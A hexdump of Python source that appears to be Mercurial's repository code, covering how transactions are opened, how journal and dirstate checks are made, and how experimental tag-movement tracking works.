+00014720: 7061 7473 2c20 6669 6c65 6e61 6d65 2c20  pats, filename, 
+00014730: 6461 7461 290a 0a20 2020 2064 6566 2063  data)..    def c
+00014740: 7572 7265 6e74 7472 616e 7361 6374 696f  urrenttransactio
+00014750: 6e28 7365 6c66 293a 0a20 2020 2020 2020  n(self):.       
+00014760: 2022 2222 7265 7475 726e 2074 6865 2063   """return the c
+00014770: 7572 7265 6e74 2074 7261 6e73 6163 7469  urrent transacti
+00014780: 6f6e 206f 7220 4e6f 6e65 2069 6620 6e6f  on or None if no
+00014790: 6e20 6578 6973 7473 2222 220a 2020 2020  n exists""".    
+000147a0: 2020 2020 6966 2073 656c 662e 5f74 7261      if self._tra
+000147b0: 6e73 7265 663a 0a20 2020 2020 2020 2020  nsref:.         
+000147c0: 2020 2074 7220 3d20 7365 6c66 2e5f 7472     tr = self._tr
+000147d0: 616e 7372 6566 2829 0a20 2020 2020 2020  ansref().       
+000147e0: 2065 6c73 653a 0a20 2020 2020 2020 2020   else:.         
+000147f0: 2020 2074 7220 3d20 4e6f 6e65 0a0a 2020     tr = None..  
+00014800: 2020 2020 2020 6966 2074 7220 616e 6420        if tr and 
+00014810: 7472 2e72 756e 6e69 6e67 2829 3a0a 2020  tr.running():.  
+00014820: 2020 2020 2020 2020 2020 7265 7475 726e            return
+00014830: 2074 720a 2020 2020 2020 2020 7265 7475   tr.        retu
+00014840: 726e 204e 6f6e 650a 0a20 2020 2064 6566  rn None..    def
+00014850: 2074 7261 6e73 6163 7469 6f6e 2873 656c   transaction(sel
+00014860: 662c 2064 6573 632c 2072 6570 6f72 743d  f, desc, report=
+00014870: 4e6f 6e65 293a 0a20 2020 2020 2020 2069  None):.        i
+00014880: 6620 7365 6c66 2e75 692e 636f 6e66 6967  f self.ui.config
+00014890: 626f 6f6c 2862 2764 6576 656c 272c 2062  bool(b'devel', b
+000148a0: 2761 6c6c 2d77 6172 6e69 6e67 7327 2920  'all-warnings') 
+000148b0: 6f72 2073 656c 662e 7569 2e63 6f6e 6669  or self.ui.confi
+000148c0: 6762 6f6f 6c28 0a20 2020 2020 2020 2020  gbool(.         
+000148d0: 2020 2062 2764 6576 656c 272c 2062 2763     b'devel', b'c
+000148e0: 6865 636b 2d6c 6f63 6b73 270a 2020 2020  heck-locks'.    
+000148f0: 2020 2020 293a 0a20 2020 2020 2020 2020      ):.         
+00014900: 2020 2069 6620 7365 6c66 2e5f 6375 7272     if self._curr
+00014910: 656e 746c 6f63 6b28 7365 6c66 2e5f 6c6f  entlock(self._lo
+00014920: 636b 7265 6629 2069 7320 4e6f 6e65 3a0a  ckref) is None:.
+00014930: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00014940: 7261 6973 6520 6572 726f 722e 5072 6f67  raise error.Prog
+00014950: 7261 6d6d 696e 6745 7272 6f72 2862 2774  rammingError(b't
+00014960: 7261 6e73 6163 7469 6f6e 2072 6571 7569  ransaction requi
+00014970: 7265 7320 6c6f 636b 696e 6727 290a 2020  res locking').  
+00014980: 2020 2020 2020 7472 203d 2073 656c 662e        tr = self.
+00014990: 6375 7272 656e 7474 7261 6e73 6163 7469  currenttransacti
+000149a0: 6f6e 2829 0a20 2020 2020 2020 2069 6620  on().        if 
+000149b0: 7472 2069 7320 6e6f 7420 4e6f 6e65 3a0a  tr is not None:.
+000149c0: 2020 2020 2020 2020 2020 2020 7265 7475              retu
+000149d0: 726e 2074 722e 6e65 7374 286e 616d 653d  rn tr.nest(name=
+000149e0: 6465 7363 290a 0a20 2020 2020 2020 2023  desc)..        #
+000149f0: 2061 626f 7274 2068 6572 6520 6966 2074   abort here if t
+00014a00: 6865 206a 6f75 726e 616c 2061 6c72 6561  he journal alrea
+00014a10: 6479 2065 7869 7374 730a 2020 2020 2020  dy exists.      
+00014a20: 2020 6966 2073 656c 662e 7376 6673 2e65    if self.svfs.e
+00014a30: 7869 7374 7328 6222 6a6f 7572 6e61 6c22  xists(b"journal"
+00014a40: 293a 0a20 2020 2020 2020 2020 2020 2072  ):.            r
+00014a50: 6169 7365 2065 7272 6f72 2e52 6570 6f45  aise error.RepoE
+00014a60: 7272 6f72 280a 2020 2020 2020 2020 2020  rror(.          
+00014a70: 2020 2020 2020 5f28 6222 6162 616e 646f        _(b"abando
+00014a80: 6e65 6420 7472 616e 7361 6374 696f 6e20  ned transaction 
+00014a90: 666f 756e 6422 292c 0a20 2020 2020 2020  found"),.       
+00014aa0: 2020 2020 2020 2020 2068 696e 743d 5f28           hint=_(
+00014ab0: 6222 7275 6e20 2768 6720 7265 636f 7665  b"run 'hg recove
+00014ac0: 7227 2074 6f20 636c 6561 6e20 7570 2074  r' to clean up t
+00014ad0: 7261 6e73 6163 7469 6f6e 2229 2c0a 2020  ransaction"),.  
+00014ae0: 2020 2020 2020 2020 2020 290a 0a20 2020            )..   
+00014af0: 2020 2020 2023 2041 7420 7468 6174 2070       # At that p
+00014b00: 6f69 6e74 2079 6f75 7220 6469 7273 7461  oint your dirsta
+00014b10: 7465 2073 686f 756c 6420 6265 2063 6c65  te should be cle
+00014b20: 616e 3a0a 2020 2020 2020 2020 230a 2020  an:.        #.  
+00014b30: 2020 2020 2020 2320 2d20 4966 2079 6f75        # - If you
+00014b40: 2064 6f6e 2774 2068 6176 6520 7468 6520   don't have the 
+00014b50: 776c 6f63 6b2c 2077 6879 2077 6f75 6c64  wlock, why would
+00014b60: 2079 6f75 2073 7469 6c6c 2068 6176 6520   you still have 
+00014b70: 6120 6469 7274 790a 2020 2020 2020 2020  a dirty.        
+00014b80: 2320 2020 6469 7273 7461 7465 203f 0a20  #   dirstate ?. 
+00014b90: 2020 2020 2020 2023 0a20 2020 2020 2020         #.       
+00014ba0: 2023 202d 2049 6620 796f 7520 686f 6c64   # - If you hold
+00014bb0: 2074 6865 2077 6c6f 636b 2c20 796f 7520   the wlock, you 
+00014bc0: 7368 6f75 6c64 206e 6f74 2062 6520 6f70  should not be op
+00014bd0: 656e 696e 6720 6120 7472 616e 7361 6374  ening a transact
+00014be0: 696f 6e20 696e 0a20 2020 2020 2020 2023  ion in.        #
+00014bf0: 2020 2074 6865 206d 6964 646c 6520 6f66     the middle of
+00014c00: 2061 2060 6469 7374 6174 652e 6368 616e   a `distate.chan
+00014c10: 6769 6e67 5f2a 6020 626c 6f63 6b2e 2054  ging_*` block. T
+00014c20: 6865 2074 7261 6e73 6163 7469 6f6e 206e  he transaction n
+00014c30: 6565 6473 2074 6f0a 2020 2020 2020 2020  eeds to.        
+00014c40: 2320 2020 6265 206f 7065 6e20 6265 666f  #   be open befo
+00014c50: 7265 2074 6861 7420 616e 6420 7772 6170  re that and wrap
+00014c60: 2074 6865 2063 6861 6e67 652d 636f 6e74   the change-cont
+00014c70: 6578 742e 0a20 2020 2020 2020 2023 0a20  ext..        #. 
+00014c80: 2020 2020 2020 2023 202d 2049 6620 796f         # - If yo
+00014c90: 7520 6172 6520 6e6f 7420 7769 7468 696e  u are not within
+00014ca0: 2061 2060 6469 7273 7461 7465 2e63 6861   a `dirstate.cha
+00014cb0: 6e67 696e 675f 2a60 2063 6f6e 7465 7874  nging_*` context
+00014cc0: 2c20 7768 7920 6973 206f 7572 0a20 2020  , why is our.   
+00014cd0: 2020 2020 2023 2020 2064 6972 7374 6174       #   dirstat
+00014ce0: 6520 6469 7274 793f 0a20 2020 2020 2020  e dirty?.       
+00014cf0: 2069 6620 7365 6c66 2e64 6972 7374 6174   if self.dirstat
+00014d00: 652e 5f64 6972 7479 3a0a 2020 2020 2020  e._dirty:.      
+00014d10: 2020 2020 2020 6d20 3d20 2263 616e 6e6f        m = "canno
+00014d20: 7420 6f70 656e 2061 2074 7261 6e73 6163  t open a transac
+00014d30: 7469 6f6e 2077 6974 6820 6120 6469 7274  tion with a dirt
+00014d40: 7920 6469 7273 7461 7465 220a 2020 2020  y dirstate".    
+00014d50: 2020 2020 2020 2020 7261 6973 6520 6572          raise er
+00014d60: 726f 722e 5072 6f67 7261 6d6d 696e 6745  ror.ProgrammingE
+00014d70: 7272 6f72 286d 290a 0a20 2020 2020 2020  rror(m)..       
+00014d80: 2069 6462 6173 6520 3d20 6222 252e 3430   idbase = b"%.40
+00014d90: 6623 2566 2220 2520 2872 616e 646f 6d2e  f#%f" % (random.
+00014da0: 7261 6e64 6f6d 2829 2c20 7469 6d65 2e74  random(), time.t
+00014db0: 696d 6528 2929 0a20 2020 2020 2020 2068  ime()).        h
+00014dc0: 6120 3d20 6865 7828 6861 7368 7574 696c  a = hex(hashutil
+00014dd0: 2e73 6861 3128 6964 6261 7365 292e 6469  .sha1(idbase).di
+00014de0: 6765 7374 2829 290a 2020 2020 2020 2020  gest()).        
+00014df0: 7478 6e69 6420 3d20 6227 5458 4e3a 2720  txnid = b'TXN:' 
+00014e00: 2b20 6861 0a20 2020 2020 2020 2073 656c  + ha.        sel
+00014e10: 662e 686f 6f6b 2862 2770 7265 7478 6e6f  f.hook(b'pretxno
+00014e20: 7065 6e27 2c20 7468 726f 773d 5472 7565  pen', throw=True
+00014e30: 2c20 7478 6e6e 616d 653d 6465 7363 2c20  , txnname=desc, 
+00014e40: 7478 6e69 643d 7478 6e69 6429 0a0a 2020  txnid=txnid)..  
+00014e50: 2020 2020 2020 7365 6c66 2e5f 7772 6974        self._writ
+00014e60: 656a 6f75 726e 616c 2864 6573 6329 0a20  ejournal(desc). 
+00014e70: 2020 2020 2020 2072 656e 616d 6573 203d         renames =
+00014e80: 205b 2876 6673 2c20 782c 2075 6e64 6f6e   [(vfs, x, undon
+00014e90: 616d 6528 7829 2920 666f 7220 7666 732c  ame(x)) for vfs,
+00014ea0: 2078 2069 6e20 7365 6c66 2e5f 6a6f 7572   x in self._jour
+00014eb0: 6e61 6c66 696c 6573 2829 5d0a 2020 2020  nalfiles()].    
+00014ec0: 2020 2020 6966 2072 6570 6f72 743a 0a20      if report:. 
+00014ed0: 2020 2020 2020 2020 2020 2072 7020 3d20             rp = 
+00014ee0: 7265 706f 7274 0a20 2020 2020 2020 2065  report.        e
+00014ef0: 6c73 653a 0a20 2020 2020 2020 2020 2020  lse:.           
+00014f00: 2072 7020 3d20 7365 6c66 2e75 692e 7761   rp = self.ui.wa
+00014f10: 726e 0a20 2020 2020 2020 2076 6673 6d61  rn.        vfsma
+00014f20: 7020 3d20 7b62 2770 6c61 696e 273a 2073  p = {b'plain': s
+00014f30: 656c 662e 7666 732c 2062 2773 746f 7265  elf.vfs, b'store
+00014f40: 273a 2073 656c 662e 7376 6673 7d20 2023  ': self.svfs}  #
+00014f50: 2072 6f6f 7420 6f66 202e 6867 2f0a 2020   root of .hg/.  
+00014f60: 2020 2020 2020 2320 7765 206d 7573 7420        # we must 
+00014f70: 6176 6f69 6420 6379 636c 6963 2072 6566  avoid cyclic ref
+00014f80: 6572 656e 6365 2062 6574 7765 656e 2072  erence between r
+00014f90: 6570 6f20 616e 6420 7472 616e 7361 6374  epo and transact
+00014fa0: 696f 6e2e 0a20 2020 2020 2020 2072 6570  ion..        rep
+00014fb0: 6f72 6566 203d 2077 6561 6b72 6566 2e72  oref = weakref.r
+00014fc0: 6566 2873 656c 6629 0a20 2020 2020 2020  ef(self).       
+00014fd0: 2023 2043 6f64 6520 746f 2074 7261 636b   # Code to track
+00014fe0: 2074 6167 206d 6f76 656d 656e 740a 2020   tag movement.  
+00014ff0: 2020 2020 2020 230a 2020 2020 2020 2020        #.        
+00015000: 2320 5369 6e63 6520 7461 6773 2061 7265  # Since tags are
+00015010: 2061 6c6c 2068 616e 646c 6564 2061 7320   all handled as 
+00015020: 6669 6c65 2063 6f6e 7465 6e74 2c20 6974  file content, it
+00015030: 2069 7320 6163 7475 616c 6c79 2071 7569   is actually qui
+00015040: 7465 2068 6172 640a 2020 2020 2020 2020  te hard.        
+00015050: 2320 746f 2074 7261 636b 2074 6865 7365  # to track these
+00015060: 206d 6f76 656d 656e 7420 6672 6f6d 2061   movement from a
+00015070: 2063 6f64 6520 7065 7273 7065 6374 6976   code perspectiv
+00015080: 652e 2053 6f20 7765 2066 616c 6c62 6163  e. So we fallbac
+00015090: 6b20 746f 2061 0a20 2020 2020 2020 2023  k to a.        #
+000150a0: 2074 7261 636b 696e 6720 6174 2074 6865   tracking at the
+000150b0: 2072 6570 6f73 6974 6f72 7920 6c65 7665   repository leve
+000150c0: 6c2e 204f 6e65 2063 6f75 6c64 2065 6e76  l. One could env
+000150d0: 6973 696f 6e20 746f 2074 7261 636b 2063  ision to track c
+000150e0: 6861 6e67 6573 0a20 2020 2020 2020 2023  hanges.        #
+000150f0: 2074 6f20 7468 6520 272e 6867 7461 6773   to the '.hgtags
+00015100: 2720 6669 6c65 2074 6872 6f75 6768 2063  ' file through c
+00015110: 6861 6e67 6567 726f 7570 2061 7070 6c79  hangegroup apply
+00015120: 2062 7574 2074 6861 7420 6661 696c 7320   but that fails 
+00015130: 746f 0a20 2020 2020 2020 2023 2063 6f70  to.        # cop
+00015140: 6520 7769 7468 2063 6173 6520 7768 6572  e with case wher
+00015150: 6520 7472 616e 7361 6374 696f 6e20 6578  e transaction ex
+00015160: 706f 7365 206e 6577 2068 6561 6473 2077  pose new heads w
+00015170: 6974 686f 7574 2063 6861 6e67 6567 726f  ithout changegro
+00015180: 7570 0a20 2020 2020 2020 2023 2062 6569  up.        # bei
+00015190: 6e67 2069 6e76 6f6c 7665 6420 2865 673a  ng involved (eg:
+000151a0: 2070 6861 7365 206d 6f76 656d 656e 7429   phase movement)
+000151b0: 2e0a 2020 2020 2020 2020 230a 2020 2020  ..        #.    
+000151c0: 2020 2020 2320 466f 7220 6e6f 772c 2057      # For now, W
+000151d0: 6520 6761 7465 2074 6865 2066 6561 7475  e gate the featu
+000151e0: 7265 2062 6568 696e 6420 6120 666c 6167  re behind a flag
+000151f0: 2073 696e 6365 2074 6869 7320 6c69 6b65   since this like
+00015200: 6c79 2063 6f6d 6573 0a20 2020 2020 2020  ly comes.       
+00015210: 2023 2077 6974 6820 7065 7266 6f72 6d61   # with performa
+00015220: 6e63 6520 696d 7061 6374 732e 2054 6865  nce impacts. The
+00015230: 2063 7572 7265 6e74 2063 6f64 6520 7275   current code ru
+00015240: 6e20 6d6f 7265 206f 6674 656e 2074 6861  n more often tha
+00015250: 6e20 6e65 6564 6564 0a20 2020 2020 2020  n needed.       
+00015260: 2023 2061 6e64 2064 6f20 6e6f 7420 7573   # and do not us
+00015270: 6520 6361 6368 6573 2061 7320 6d75 6368  e caches as much
+00015280: 2061 7320 6974 2063 6f75 6c64 2e20 2054   as it could.  T
+00015290: 6865 2063 7572 7265 6e74 2066 6f63 7573  he current focus
+000152a0: 2069 7320 6f6e 0a20 2020 2020 2020 2023   is on.        #
+000152b0: 2074 6865 2062 6568 6176 696f 7220 6f66   the behavior of
+000152c0: 2074 6865 2066 6561 7475 7265 2073 6f20   the feature so 
+000152d0: 7765 2064 6973 6162 6c65 2069 7420 6279  we disable it by
+000152e0: 2064 6566 6175 6c74 2e20 5468 6520 666c   default. The fl
+000152f0: 6167 0a20 2020 2020 2020 2023 2077 696c  ag.        # wil
+00015300: 6c20 6265 2072 656d 6f76 6564 2077 6865  l be removed whe
+00015310: 6e20 7765 2061 7265 2068 6170 7079 2077  n we are happy w
+00015320: 6974 6820 7468 6520 7065 7266 6f72 6d61  ith the performa
+00015330: 6e63 6520 696d 7061 6374 2e0a 2020 2020  nce impact..    
+00015340: 2020 2020 230a 2020 2020 2020 2020 2320      #.        # 
+00015350: 4f6e 6365 2074 6869 7320 6665 6174 7572  Once this featur
+00015360: 6520 6973 206e 6f20 6c6f 6e67 6572 2065  e is no longer e
+00015370: 7870 6572 696d 656e 7461 6c20 6d6f 7665  xperimental move
+00015380: 2074 6865 2066 6f6c 6c6f 7769 6e67 0a20   the following. 
+00015390: 2020 2020 2020 2023 2064 6f63 756d 656e         # documen
+000153a0: 7461 7469 6f6e 2074 6f20 7468 6520 6170  tation to the ap
+000153b0: 7072 6f70 7269 6174 6520 6865 6c70 2073  propriate help s
+000153c0: 6563 7469 6f6e 3a0a 2020 2020 2020 2020  ection:.        
+000153d0: 230a 2020 2020 2020 2020 2320 5468 6520  #.        # The 
+000153e0: 6060 4847 5f54 4147 5f4d 4f56 4544 6060  ``HG_TAG_MOVED``
+000153f0: 2076 6172 6961 626c 6520 7769 6c6c 2062   variable will b
+00015400: 6520 7365 7420 6966 2074 6865 2074 7261  e set if the tra
+00015410: 6e73 6163 7469 6f6e 2074 6f75 6368 6564  nsaction touched
+00015420: 0a20 2020 2020 2020 2023 2074 6167 7320  .        # tags 
+00015430: 286e 6577 206f 7220 6368 616e 6765 6420  (new or changed 
+00015440: 6f72 2064 656c 6574 6564 2074 6167 7329  or deleted tags)
+00015450: 2e20 496e 2061 6464 6974 696f 6e20 7468  . In addition th
+00015460: 6520 6465 7461 696c 7320 6f66 0a20 2020  e details of.   
+00015470: 2020 2020 2023 2074 6865 7365 2063 6861       # these cha
+00015480: 6e67 6573 2061 7265 206d 6164 6520 6176  nges are made av
+00015490: 6169 6c61 626c 6520 696e 2061 2066 696c  ailable in a fil
+000154a0: 6520 6174 3a0a 2020 2020 2020 2020 2320  e at:.        # 
+000154b0: 2020 2020 6060 5245 504f 524f 4f54 2f2e      ``REPOROOT/.
+000154c0: 6867 2f63 6861 6e67 6573 2f74 6167 732e  hg/changes/tags.
+000154d0: 6368 616e 6765 7360 602e 0a20 2020 2020  changes``..     
+000154e0: 2020 2023 204d 616b 6520 7375 7265 2079     # Make sure y
+000154f0: 6f75 2063 6865 636b 2066 6f72 2048 475f  ou check for HG_
+00015500: 5441 475f 4d4f 5645 4420 6265 666f 7265  TAG_MOVED before
+00015510: 2072 6561 6469 6e67 2074 6861 7420 6669   reading that fi
+00015520: 6c65 2061 7320 6974 0a20 2020 2020 2020  le as it.       
+00015530: 2023 206d 6967 6874 2065 7869 7374 2066   # might exist f
+00015540: 726f 6d20 6120 7072 6576 696f 7573 2074  rom a previous t
+00015550: 7261 6e73 6163 7469 6f6e 2065 7665 6e20  ransaction even 
+00015560: 6966 206e 6f20 7461 6720 7765 7265 2074  if no tag were t
+00015570: 6f75 6368 6564 0a20 2020 2020 2020 2023  ouched.        #
+00015580: 2069 6e20 7468 6973 206f 6e65 2e20 4368   in this one. Ch
+00015590: 616e 6765 7320 6172 6520 7265 636f 7264  anges are record
+000155a0: 6564 2069 6e20 6120 6c69 6e65 2062 6173  ed in a line bas
+000155b0: 6520 666f 726d 6174 3a3a 0a20 2020 2020  e format::.     
+000155c0: 2020 2023 0a20 2020 2020 2020 2023 2020     #.        #  
+000155d0: 2020 203c 6163 7469 6f6e 3e20 3c68 6578     <action> <hex
+000155e0: 2d6e 6f64 653e 203c 7461 672d 6e61 6d65  -node> <tag-name
+000155f0: 3e5c 6e0a 2020 2020 2020 2020 230a 2020  >\n.        #.  
+00015600: 2020 2020 2020 2320 4163 7469 6f6e 7320        # Actions 
+00015610: 6172 6520 6465 6669 6e65 6420 6173 2066  are defined as f
+00015620: 6f6c 6c6f 773a 0a20 2020 2020 2020 2023  ollow:.        #
+00015630: 2020 2022 2d52 223a 2074 6167 2069 7320     "-R": tag is 
+00015640: 7265 6d6f 7665 642c 0a20 2020 2020 2020  removed,.       
+00015650: 2023 2020 2022 2b41 223a 2074 6167 2069   #   "+A": tag i
+00015660: 7320 6164 6465 642c 0a20 2020 2020 2020  s added,.       
+00015670: 2023 2020 2022 2d4d 223a 2074 6167 2069   #   "-M": tag i
+00015680: 7320 6d6f 7665 6420 286f 6c64 2076 616c  s moved (old val
+00015690: 7565 292c 0a20 2020 2020 2020 2023 2020  ue),.        #  
+000156a0: 2022 2b4d 223a 2074 6167 2069 7320 6d6f   "+M": tag is mo
+000156b0: 7665 6420 286e 6577 2076 616c 7565 292c  ved (new value),
+000156c0: 0a20 2020 2020 2020 2074 7261 636b 7461  .        trackta
+000156d0: 6773 203d 206c 616d 6264 6120 783a 204e  gs = lambda x: N
+000156e0: 6f6e 650a 2020 2020 2020 2020 2320 6578  one.        # ex
+000156f0: 7065 7269 6d65 6e74 616c 2063 6f6e 6669  perimental confi
+00015700: 673a 2065 7870 6572 696d 656e 7461 6c2e  g: experimental.
+00015710: 686f 6f6b 2d74 7261 636b 2d74 6167 730a  hook-track-tags.
+00015720: 2020 2020 2020 2020 7368 6f75 6c64 7472          shouldtr
+00015730: 6163 6b74 6167 7320 3d20 7365 6c66 2e75  acktags = self.u
+00015740: 692e 636f 6e66 6967 626f 6f6c 280a 2020  i.configbool(.  
+00015750: 2020 2020 2020 2020 2020 6227 6578 7065            b'expe
+00015760: 7269 6d65 6e74 616c 272c 2062 2768 6f6f  rimental', b'hoo
+00015770: 6b2d 7472 6163 6b2d 7461 6773 270a 2020  k-track-tags'.  
+00015780: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
+00015790: 6966 2064 6573 6320 213d 2062 2773 7472  if desc != b'str
+000157a0: 6970 2720 616e 6420 7368 6f75 6c64 7472  ip' and shouldtr
+000157b0: 6163 6b74 6167 733a 0a20 2020 2020 2020  acktags:.       
+000157c0: 2020 2020 206f 6c64 6865 6164 7320 3d20       oldheads = 
+000157d0: 7365 6c66 2e63 6861 6e67 656c 6f67 2e68  self.changelog.h
+000157e0: 6561 6472 6576 7328 290a 0a20 2020 2020  eadrevs()..     
+000157f0: 2020 2020 2020 2064 6566 2074 7261 636b         def track
+00015800: 7461 6773 2874 7232 293a 0a20 2020 2020  tags(tr2):.     
+00015810: 2020 2020 2020 2020 2020 2072 6570 6f20             repo 
+00015820: 3d20 7265 706f 7265 6628 290a 2020 2020  = reporef().    
+00015830: 2020 2020 2020 2020 2020 2020 6173 7365              asse
+00015840: 7274 2072 6570 6f20 6973 206e 6f74 204e  rt repo is not N
+00015850: 6f6e 6520 2023 2068 656c 7020 7079 7479  one  # help pyty
+00015860: 7065 0a20 2020 2020 2020 2020 2020 2020  pe.             
+00015870: 2020 206f 6c64 666e 6f64 6573 203d 2074     oldfnodes = t
+00015880: 6167 736d 6f64 2e66 6e6f 6465 7265 7673  agsmod.fnoderevs
+00015890: 2872 6570 6f2e 7569 2c20 7265 706f 2c20  (repo.ui, repo, 
+000158a0: 6f6c 6468 6561 6473 290a 2020 2020 2020  oldheads).      
+000158b0: 2020 2020 2020 2020 2020 6e65 7768 6561            newhea
+000158c0: 6473 203d 2072 6570 6f2e 6368 616e 6765  ds = repo.change
+000158d0: 6c6f 672e 6865 6164 7265 7673 2829 0a20  log.headrevs(). 
+000158e0: 2020 2020 2020 2020 2020 2020 2020 206e                 n
+000158f0: 6577 666e 6f64 6573 203d 2074 6167 736d  ewfnodes = tagsm
+00015900: 6f64 2e66 6e6f 6465 7265 7673 2872 6570  od.fnoderevs(rep
+00015910: 6f2e 7569 2c20 7265 706f 2c20 6e65 7768  o.ui, repo, newh
+00015920: 6561 6473 290a 2020 2020 2020 2020 2020  eads).          
+00015930: 2020 2020 2020 2320 6e6f 7465 733a 2077        # notes: w
+00015940: 6520 636f 6d70 6172 6520 6c69 7374 7320  e compare lists 
+00015950: 6865 7265 2e0a 2020 2020 2020 2020 2020  here..          
+00015960: 2020 2020 2020 2320 4173 2077 6520 646f        # As we do
+00015970: 2069 7420 6f6e 6c79 206f 6e63 6520 6275   it only once bu
+00015980: 6964 696e 6720 7365 7420 776f 756c 6420  iding set would 
+00015990: 6e6f 7420 6265 2063 6865 6170 6572 0a20  not be cheaper. 
+000159a0: 2020 2020 2020 2020 2020 2020 2020 2063                 c
+000159b0: 6861 6e67 6573 203d 2074 6167 736d 6f64  hanges = tagsmod
+000159c0: 2e64 6966 6674 6167 7328 7265 706f 2e75  .difftags(repo.u
+000159d0: 692c 2072 6570 6f2c 206f 6c64 666e 6f64  i, repo, oldfnod
+000159e0: 6573 2c20 6e65 7766 6e6f 6465 7329 0a20  es, newfnodes). 
+000159f0: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+00015a00: 6620 6368 616e 6765 733a 0a20 2020 2020  f changes:.     
+00015a10: 2020 2020 2020 2020 2020 2020 2020 2074                 t
+00015a20: 7232 2e68 6f6f 6b61 7267 735b 6227 7461  r2.hookargs[b'ta
+00015a30: 675f 6d6f 7665 6427 5d20 3d20 6227 3127  g_moved'] = b'1'
+00015a40: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00015a50: 2020 2020 2077 6974 6820 7265 706f 2e76       with repo.v
+00015a60: 6673 280a 2020 2020 2020 2020 2020 2020  fs(.            
+00015a70: 2020 2020 2020 2020 2020 2020 6227 6368              b'ch
+00015a80: 616e 6765 732f 7461 6773 2e63 6861 6e67  anges/tags.chang
+00015a90: 6573 272c 2062 2777 272c 2061 746f 6d69  es', b'w', atomi
+00015aa0: 6374 656d 703d 5472 7565 0a20 2020 2020  ctemp=True.     
+00015ab0: 2020 2020 2020 2020 2020 2020 2020 2029                 )
+00015ac0: 2061 7320 6368 616e 6765 7366 696c 653a   as changesfile:
+00015ad0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00015ae0: 2020 2020 2020 2020 2023 206e 6f74 653a           # note:
+00015af0: 2077 6520 646f 206e 6f74 2072 6567 6973   we do not regis
+00015b00: 7465 7220 7468 6520 6669 6c65 2074 6f20  ter the file to 
+00015b10: 7468 6520 7472 616e 7361 6374 696f 6e0a  the transaction.
+00015b20: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00015b30: 2020 2020 2020 2020 2320 6265 6361 7573          # becaus
+00015b40: 6520 7765 206e 6565 6473 2069 7420 746f  e we needs it to
+00015b50: 2073 7469 6c6c 2065 7869 7374 206f 6e20   still exist on 
+00015b60: 7468 6520 7472 616e 7361 6374 696f 6e0a  the transaction.
+00015b70: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00015b80: 2020 2020 2020 2020 2320 6973 2063 6c6f          # is clo
+00015b90: 7365 2028 666f 7220 7478 6e63 6c6f 7365  se (for txnclose
+00015ba0: 2068 6f6f 6b73 290a 2020 2020 2020 2020   hooks).        
+00015bb0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00015bc0: 7461 6773 6d6f 642e 7772 6974 6564 6966  tagsmod.writedif
+00015bd0: 6628 6368 616e 6765 7366 696c 652c 2063  f(changesfile, c
+00015be0: 6861 6e67 6573 290a 0a20 2020 2020 2020  hanges)..       
+00015bf0: 2064 6566 2076 616c 6964 6174 6528 7472   def validate(tr
+00015c00: 3229 3a0a 2020 2020 2020 2020 2020 2020  2):.            
+00015c10: 2222 2277 696c 6c20 7275 6e20 7072 652d  """will run pre-
+00015c20: 636c 6f73 696e 6720 686f 6f6b 7322 2222  closing hooks"""
+00015c30: 0a20 2020 2020 2020 2020 2020 2023 2058  .            # X
+00015c40: 5858 2074 6865 2074 7261 6e73 6163 7469  XX the transacti
+00015c50: 6f6e 2041 5049 2069 7320 6120 6269 7420  on API is a bit 
+00015c60: 6c61 636b 696e 6720 6865 7265 2073 6f20  lacking here so 
+00015c70: 7765 2074 616b 6520 6120 6861 636b 790a  we take a hacky.
+00015c80: 2020 2020 2020 2020 2020 2020 2320 7061              # pa
+00015c90: 7468 2066 6f72 206e 6f77 0a20 2020 2020  th for now.     
+00015ca0: 2020 2020 2020 2023 0a20 2020 2020 2020         #.       
+00015cb0: 2020 2020 2023 2057 6520 6361 6e6e 6f74       # We cannot
+00015cc0: 2061 6464 2074 6869 7320 6173 2061 2022   add this as a "
+00015cd0: 7065 6e64 696e 6722 2068 6f6f 6b73 2073  pending" hooks s
+00015ce0: 696e 6365 2074 6865 2027 7472 2e68 6f6f  ince the 'tr.hoo
+00015cf0: 6b61 7267 7327 0a20 2020 2020 2020 2020  kargs'.         
+00015d00: 2020 2023 2064 6963 7420 6973 2063 6f70     # dict is cop
+00015d10: 6965 6420 6265 666f 7265 2074 6865 7365  ied before these
+00015d20: 2072 756e 2e20 496e 2061 6464 6974 696f   run. In additio
+00015d30: 6e20 7765 206e 6565 6473 2074 6865 2064  n we needs the d
+00015d40: 6174 610a 2020 2020 2020 2020 2020 2020  ata.            
+00015d50: 2320 6176 6169 6c61 626c 6520 746f 2069  # available to i
+00015d60: 6e20 6d65 6d6f 7279 2068 6f6f 6b73 2074  n memory hooks t
+00015d70: 6f6f 2e0a 2020 2020 2020 2020 2020 2020  oo..            
+00015d80: 230a 2020 2020 2020 2020 2020 2020 2320  #.            # 
+00015d90: 4d6f 7265 6f76 6572 2c20 7765 2061 6c73  Moreover, we als
+00015da0: 6f20 6e65 6564 2074 6f20 6d61 6b65 2073  o need to make s
+00015db0: 7572 6520 7468 6973 2072 756e 7320 6265  ure this runs be
+00015dc0: 666f 7265 2074 786e 636c 6f73 650a 2020  fore txnclose.  
+00015dd0: 2020 2020 2020 2020 2020 2320 686f 6f6b            # hook
+00015de0: 7320 616e 6420 7468 6572 6520 6973 206e  s and there is n
+00015df0: 6f20 2270 656e 6469 6e67 2220 6d65 6368  o "pending" mech
+00015e00: 616e 6973 6d20 7468 6174 2077 6f75 6c64  anism that would
+00015e10: 2065 7865 6375 7465 0a20 2020 2020 2020   execute.       
+00015e20: 2020 2020 2023 206c 6f67 6963 206f 6e6c       # logic onl
+00015e30: 7920 6966 2068 6f6f 6b73 2061 7265 2061  y if hooks are a
+00015e40: 626f 7574 2074 6f20 7275 6e2e 0a20 2020  bout to run..   
+00015e50: 2020 2020 2020 2020 2023 0a20 2020 2020           #.     
+00015e60: 2020 2020 2020 2023 2046 6978 696e 6720         # Fixing 
+00015e70: 7468 6973 206c 696d 6974 6174 696f 6e20  this limitation 
+00015e80: 6f66 2074 6865 2074 7261 6e73 6163 7469  of the transacti
+00015e90: 6f6e 2069 7320 616c 736f 206e 6565 6465  on is also neede
+00015ea0: 6420 746f 2074 7261 636b 0a20 2020 2020  d to track.     
